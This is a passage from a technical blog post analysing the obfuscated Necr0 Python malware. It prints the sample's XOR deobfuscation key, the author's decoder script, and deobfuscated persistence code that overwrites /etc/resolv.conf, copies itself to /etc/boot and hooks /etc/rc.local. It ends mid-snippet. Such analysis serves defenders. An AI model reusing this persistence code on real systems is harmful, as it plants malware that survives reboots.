<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Technical Analysis Of The Necr0 Python Malware"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Technical Analysis Of The Necr0 Python Malware"><meta name=twitter:title content="dubell.io | Technical Analysis Of The Necr0 Python Malware"><meta itemprop=name content="dubell.io | Technical Analysis Of The Necr0 Python Malware"><meta name=application-name content="dubell.io | Technical Analysis Of The Necr0 Python Malware"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-04-20T13:13:37Z"><meta property="article:published_time" content="2020-04-20T13:13:37Z"><base href=https://dubell.io/technical-analysis-of-the-necr0-python-malware/><link rel=canonical href=https://dubell.io/technical-analysis-of-the-necr0-python-malware/ itemprop=url><meta name=url content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/"><meta name=twitter:url content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/"><meta property="og:url" content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Analysing obfuscated python malware with polymorphic properties"><meta itemprop=description content="Analysing obfuscated python malware with polymorphic properties"><meta property="og:description" content="Analysing obfuscated python malware with polymorphic properties"><meta name=twitter:description content="Analysing obfuscated python malware with polymorphic properties"><meta itemprop=image content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/necr0.png"><meta property="og:image" content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/necr0.png"><meta name=twitter:image content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/necr0.png"><meta name=twitter:image:src content="https://dubell.io/technical-analysis-of-the-necr0-python-malware/necr0.png"><meta property="og:updated_time" content="2020-04-20T13:13:37Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io/sitemap.xml><title>dubell.io | Technical Analysis Of The Necr0 Python Malware</title></head><body><div class=container><div id=particles-js></div><div class=row><div class=col><header style=text-align:center><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></header></div></div><div class=row><div class=col style=text-align:center><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=row><div class=content><article><div class=row><div class=col><h1>Technical Analysis Of The Necr0 Python Malware</h1><p class=small style=color:#999><a href=/categories/malware-analysis>Malware-Analysis</a> / April 20, 2020 â€¢ 11 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/python class=tag>python</a> <a href=/tags/malware class=tag>malware</a></p></div></div><div class=row><div class=col><div id=article-content><p>I recently got a hold of a malware sample written in python that dropped crypto currency miners, among other things. It was built with Python2.7 and was heavily obfuscated. I decided to analyse it and try to break it apart to understand it better and its capabilities.</p><p>In this article, I will show some parts of the malware and explain its purpose. I will also provide some detection techniques for detecting this specific malware.</p><p>Variables and method names have been changed to make more sense for the reader. Code snippets have been shortened for the sake of brevity.</p><h2 id=defeating-obfuscation>Defeating obfuscation</h2><p>Before analysing the malware, I wanted to try to remove as much obfuscation as possible without manually editing the code. I created a script that transformed the following obfuscated code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>    <span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>aTJLaPaEfTy</span>(self):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>        <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>            waibPgcEvaVW=open(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\xd4\x2a\xa4\xff\xdd\xed\xe6\xee\xa0\xb9\xae\x0a\x00\x3d\xde\x07\x0f</span><span style=color:#0086d2>&#34;</span>)), <span style=color:#0086d2>&#34;w&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>            waibPgcEvaVW.write(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xdb\x15\x96\x2c\x23\x37\x89\x55\xeb\x6f\x44\xff\x12\xf9\xc3\xac\xe5\x57\x4e\xfa\xed\x42\x16\x3a\xc4\x5a\x06\x14\x02\x00\x35\x84\x10\x7d</span><span style=color:#0086d2>&#34;</span>)))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>            waibPgcEvaVW.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>            rc=open(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\xd4\x2a\x52\xf4\xc5\xf5\xcc\x97\x58\x00\x2b\x19\x06\x85</span><span style=color:#0086d2>&#34;</span>)),<span style=color:#0086d2>&#34;rb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>            data=rc.read()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>            rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            <span style=color:#fb660a;font-weight:700>if</span> EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xdb\x16\x91\xc8\x0b\x00\x04\xb3\x01\x7d</span><span style=color:#0086d2>&#34;</span>)) not in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>                <span style=color:#fb660a;font-weight:700>with</span> open(LEhPiouaoL, <span style=color:#0086d2>&#39;rb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> ihzgdpAh, open(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\x34\x55\xc2\xf8\x0d\x00\x14\x96\x03\xf0</span><span style=color:#0086d2>&#34;</span>)), <span style=color:#0086d2>&#39;wb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> awhadRloi:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                    <span style=color:#fb660a;font-weight:700>while</span> <span style=color:#fb660a;font-weight:700>True</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                        BCToiLPREy = ihzgdpAh.read(<span style=color:#0086f7;font-weight:700>1024</span>*<span style=color:#0086f7;font-weight:700>1024</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                        <span style=color:#fb660a;font-weight:700>if</span> not BCToiLPREy:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                            <span style=color:#fb660a;font-weight:700>break</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                        awhadRloi.write(BCToiLPREy)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>                os.chmod(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\x34\x55\xc2\xf8\x0d\x00\x14\x96\x03\xf0</span><span style=color:#0086d2>&#34;</span>)), <span style=color:#0086f7;font-weight:700>777</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>                rc=open(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\xd4\x2a\x52\xf4\xc5\xf5\xcc\x97\x58\x00\x2b\x19\x06\x85</span><span style=color:#0086d2>&#34;</span>)),<span style=color:#0086d2>&#34;wb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                <span style=color:#fb660a;font-weight:700>if</span> EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xdb\xe8\x9f\xce\x0b\x00\x04\x90\x01\x75</span><span style=color:#0086d2>&#34;</span>)) in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                    rc.write(data.replace(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xdb\xe8\x9f\xce\x0b\x00\x04\x90\x01\x75</span><span style=color:#0086d2>&#34;</span>)), EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xfb\x1d\x54\x25\xe5\x34\x55\xc2\xf8\x8d\xc2\xa9\xb7\x11\x6d\x00\x30\x0b\x06\xa5</span><span style=color:#0086d2>&#34;</span>))))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                    rc.write(EcvPaTMdf(zlib.decompress(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\x78\x9c\xbb\x27\x91\xcd\xcb\x77\x43\xd4\xf8\x7b\x1c\x00\x15\x06\x03\xf2</span><span style=color:#0086d2>&#34;</span>)))    
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>        <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>            <span style=color:#fb660a;font-weight:700>pass</span>
</span></span></code></pre></div><p>Into a much more readable version:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>HYZwyjaoSAo</span>(self):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        EuwdcwhxZEy=open(<span style=color:#0086d2>&#34;/etc/resolv.conf&#34;</span>, <span style=color:#0086d2>&#34;w&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        EuwdcwhxZEy.write(<span style=color:#0086d2>&#34;nameserver 1.1.1.1 </span><span style=color:#0086d2>\\</span><span style=color:#0086d2> nameserver 1.0.0.1&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        EuwdcwhxZEy.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        rc=open(<span style=color:#0086d2>&#34;/etc/rc.local&#34;</span>,<span style=color:#0086d2>&#34;rb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        data=rc.read()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;boot&#34;</span> not in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#fb660a;font-weight:700>with</span> open(currentExecFile, <span style=color:#0086d2>&#39;rb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> ofuhaBwXIc, open(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>, <span style=color:#0086d2>&#39;wb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> nFnawMFdkiMV:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                <span style=color:#fb660a;font-weight:700>while</span> <span style=color:#fb660a;font-weight:700>True</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                    ooihBBfeps = ofuhaBwXIc.read(<span style=color:#0086f7;font-weight:700>1024</span>*<span style=color:#0086f7;font-weight:700>1024</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                    <span style=color:#fb660a;font-weight:700>if</span> not ooihBBfeps:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                        <span style=color:#fb660a;font-weight:700>break</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                    nFnawMFdkiMV.write(ooihBBfeps)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            os.chmod(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>, <span style=color:#0086f7;font-weight:700>777</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            rc=open(<span style=color:#0086d2>&#34;/etc/rc.local&#34;</span>,<span style=color:#0086d2>&#34;wb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;exit&#34;</span> in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                rc.write(data.replace(<span style=color:#0086d2>&#34;exit&#34;</span>, <span style=color:#0086d2>&#34;/etc/boot </span><span style=color:#0086d2>\\</span><span style=color:#0086d2> exit&#34;</span>))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                rc.write(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>            rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        <span style=color:#fb660a;font-weight:700>pass</span>
</span></span></code></pre></div><p>This is possible because we know the obfuscation algorithm, which looks like this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>EcvPaTMdf</span>(s):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    bhhSOgogRj = [<span style=color:#0086f7;font-weight:700>212</span>, <span style=color:#0086f7;font-weight:700>55</span>, <span style=color:#0086f7;font-weight:700>14</span>, <span style=color:#0086f7;font-weight:700>121</span>, <span style=color:#0086f7;font-weight:700>109</span>, <span style=color:#0086f7;font-weight:700>247</span>, <span style=color:#0086f7;font-weight:700>119</span>, <span style=color:#0086f7;font-weight:700>92</span>, <span style=color:#0086f7;font-weight:700>152</span>, <span style=color:#0086f7;font-weight:700>42</span>, <span style=color:#0086f7;font-weight:700>175</span>, <span style=color:#0086f7;font-weight:700>149</span>, <span style=color:#0086f7;font-weight:700>49</span>, <span style=color:#0086f7;font-weight:700>242</span>, <span style=color:#0086f7;font-weight:700>43</span>, <span style=color:#0086f7;font-weight:700>70</span>, <span style=color:#0086f7;font-weight:700>250</span>, <span style=color:#0086f7;font-weight:700>248</span>, <span style=color:#0086f7;font-weight:700>68</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086d2>&#39;&#39;</span>.join([chr(ord(c) ^ bhhSOgogRj[i % len(bhhSOgogRj)]) <span style=color:#fb660a;font-weight:700>for</span> i, c in enumerate(s)])
</span></span></code></pre></div><p>The variable <code>bhhSOgogRj</code> contains the secret key used XOR characters. Armed with this knowledge, we can build a decoder script:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#fb660a;font-weight:700>import</span> re
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#fb660a;font-weight:700>import</span> zlib
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>decode</span>(s):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    bhhSOgogRj = [<span style=color:#0086f7;font-weight:700>212</span>, <span style=color:#0086f7;font-weight:700>55</span>, <span style=color:#0086f7;font-weight:700>14</span>, <span style=color:#0086f7;font-weight:700>121</span>, <span style=color:#0086f7;font-weight:700>109</span>, <span style=color:#0086f7;font-weight:700>247</span>, <span style=color:#0086f7;font-weight:700>119</span>, <span style=color:#0086f7;font-weight:700>92</span>, <span style=color:#0086f7;font-weight:700>152</span>, <span style=color:#0086f7;font-weight:700>42</span>, <span style=color:#0086f7;font-weight:700>175</span>, <span style=color:#0086f7;font-weight:700>149</span>, <span style=color:#0086f7;font-weight:700>49</span>, <span style=color:#0086f7;font-weight:700>242</span>, <span style=color:#0086f7;font-weight:700>43</span>, <span style=color:#0086f7;font-weight:700>70</span>, <span style=color:#0086f7;font-weight:700>250</span>, <span style=color:#0086f7;font-weight:700>248</span>, <span style=color:#0086f7;font-weight:700>68</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086d2>&#39;&#39;</span>.join([chr(c ^ bhhSOgogRj[i % len(bhhSOgogRj)]) <span style=color:#fb660a;font-weight:700>for</span> i, c in enumerate(s)])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>reg = re.compile(<span style=color:#0086d2>&#34;([A-Za-z]+\(zlib\.decompress\(</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>([</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>a-f0-9x]+)</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>\)\))&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#fb660a;font-weight:700>with</span> open(<span style=color:#0086d2>&#34;benchmark.py&#34;</span>, <span style=color:#0086d2>&#34;r&#34;</span>) <span style=color:#fb660a;font-weight:700>as</span> f:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    data = f.read()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    found = reg.findall(data)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#fb660a;font-weight:700>if</span> found:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#fb660a;font-weight:700>for</span> line in found:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            hex_value = line[<span style=color:#0086f7;font-weight:700>1</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            full_string = line[<span style=color:#0086f7;font-weight:700>0</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>            hx = hex_value.replace(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x&#34;</span>,<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            s = bytearray.fromhex(hx)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>            y = zlib.decompress(s)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>            <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>                a = data.replace(full_string, <span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>{</span>decode(y)<span style=color:#0086d2>}</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>                data = a
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>            <span style=color:#fb660a;font-weight:700>except</span> Exception:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                print(<span style=color:#0086d2>&#34;error&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                <span style=color:#fb660a;font-weight:700>continue</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#fb660a;font-weight:700>with</span> open(<span style=color:#0086d2>&#34;deobfuscated.py&#34;</span>, <span style=color:#0086d2>&#34;w&#34;</span>) <span style=color:#fb660a;font-weight:700>as</span> o:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>        o.write(data)
</span></span></code></pre></div><p>Now I can begin analysing the malware.</p><h2 id=first-steps>First steps</h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#fb660a;font-weight:700>if</span> forkSuccessful():
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    writePID(<span style=color:#0086d2>&#34;.pidw&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>    nPhcxQhVzd()
</span></span></code></pre></div><p>Immediately when the program starts, it tries to fork itself into a new process. If <code>return 0</code> is executed, the malware will not run.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>forkSuccessful</span>():
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        pid = os.fork()
